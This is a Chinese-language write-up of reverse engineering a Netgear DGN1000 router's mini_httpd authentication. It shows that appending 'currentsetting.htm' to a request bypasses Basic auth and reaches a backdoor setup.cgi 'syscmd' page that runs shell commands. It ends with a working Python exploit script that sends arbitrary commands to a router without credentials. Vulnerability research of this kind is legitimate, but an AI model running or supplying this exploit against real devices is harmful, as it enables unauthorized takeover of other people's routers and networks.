# DGN1000_unauthorized_comamnd_injection






---

![](vx_images/21526719452531.png)


最后在这里发现了个后门页面，访问发现可以命令执行 。


![](vx_images/535906218752489.png)

![](vx_images/77490624384333.png)

但是现在是已授权命令执行，我们需要绕过BA认证。
![](vx_images/536381941701306.png)
删除Authorization: Basic YWRtaW46cGFzc3dvcmQ=后，会显示Authorization: warning，无法命令执行。

---
# 未授权绕过

本服务是用mini_httpd起的，Authorization功能应该也是在其中的。我们用ida分析看看

![](vx_images/471122002746760.png)
尝试用授权相关的字符串定位WWW-Authenticate:

![](vx_images/596833289219970.png)

查看上级调用的函数，注意到系统日志记录了Administrator login successful - IP:%s
![](vx_images/390022922856594.png)



接下来，我们注意到打印登录成功日志前，有一个判断。
![](vx_images/552905401506301.png)

如果flag==0  就会正常执行登录流程，并用kill(ppid,1)将程序挂起。而kill(ppid,17)则会终止程序。这也从侧面说明，它是授权判断完成后，再结束程序的，所以我们只要能控制flag的值为0，很可能就能登录成功。

---

所以这里我们去查看flag的引用，看是否又可以给它赋值的地方。


![](vx_images/483973858331806.png)

我们看到这里给flag赋值了。
同时让我们再来关注下a1是从哪里来的
![](vx_images/533044257912102.png)
首先a1由调用函数传参。

![](vx_images/290821426444562.png)
来自于dword_100000DC.
![](vx_images/418902345195970.png)

在整个上层函数中，只有这里调用了它。
程序的逻辑如下
```
currentsetting.htm存在 -----》dword_100000DC=0   -------》a1=0   ---------》不进入if(a1),直接执行后面的功能
```





详细分析下if(a1)这里

![](vx_images/434784871821804.png)


如果flag==1的话，跳转到lable12
![](vx_images/490116421823088.png)

# 结构体stat知识补充
```
int stat(const char *path, struct stat *buf);
参数
    path：要获取状态信息的文件或目录的路径。
    buf：指向一个 struct stat 结构体的指针，stat 函数会将文件状态信息填充到这个结构体中。
返回值
    返回 0 表示成功。
    返回 -1 表示失败，并设置 errno 以指示具体错误。
```

# 代码分析


 前面定义了
 char v116[10000]; // [sp+2B28h] [-3330h] BYREF
 struct stat v117; // [sp+5238h] [-C20h] BYREF


![](vx_images/297617282595866.png)
这里拼接路径，加上后缀/.htpasswd
stat 函数用于检查 .htpasswd 文件是否存在，如果不存在且 IP 地址与预期不符，则记录管理员登录成功的日志

---

解释下这个判断
![](vx_images/144466560117124.png)
```
这个地方，是因为每次进来的数据包ip_addr会被存在&byte_10000040这个位置。只有另一个ip再登录的时候，才会系统才会打印"Administrator login successful - IP:%s"
不做这个判断的话，同一个ip每次发一个包，日志就会记录这个
```

---






如果这里没有进入if(stat())
程序会执行如下  代码行173到292
```

```

![](vx_images/326568052935500.png)

先判断dword_100073B0是否存在，不存在输出未授权
拿出前6个字节，和Basic 比较，不一样也输出未授权。
那很明显，后面它就要比较base64加密后的密码了

![](vx_images/216386443090192.png)
果然下面调用了strcmp  ,且在比较后打印是否授权成功。



---
所以到这里我们可以判断，

当a1=1,flag=0,会直接认证成功。
当a1=1,flag=1时，会进行账号密码的验证。
当a1=0, 会直接if（）中的语句，直接绕过验证，继续执行LABEL_61:  后的代码

---


因为验证是否授权，都在这个if(a1)中，所以a1=0  直接跳到后面，实现了未授权。



# 向上寻找输入点
所以综合上述，我们只要保证dword_10007390中有currentsetting.htm就可能实现未授权命令执行。

![](vx_images/483973858331806.png)

---
## 思路1
简单思路如下：
![](vx_images/42327572223737.png)

dword_10007390之前先做了判断，之后来自于格式化字符串/ca/setup.cgi?next_file=%s格式。感觉上是从url头获取的值，所以尝试一下，也可以越权


![](vx_images/83186467257873.png)

成功越权了。

---

exp编写

```
import requests

cmd = "ls"
target_ip="192.168.0.1"



burp0_url = "http://"+target_ip+"/setup.cgi?todo=syscmd&cmd=" + cmd + "&_=1721817685516&currentsetting.htm"
burp0_headers = {
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0",
    "Accept": "*/*",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "X-Requested-With": "XMLHttpRequest",
    "Connection": "close",
    "Referer": "http://192.168.0.1/syscmd.htm"
}


response = requests.get(burp0_url, headers=burp0_headers)


if response.status_code == 200:

    print "Response content:"
    print response.text
else:
    print "Request failed with status code:", response.status_code

```

---




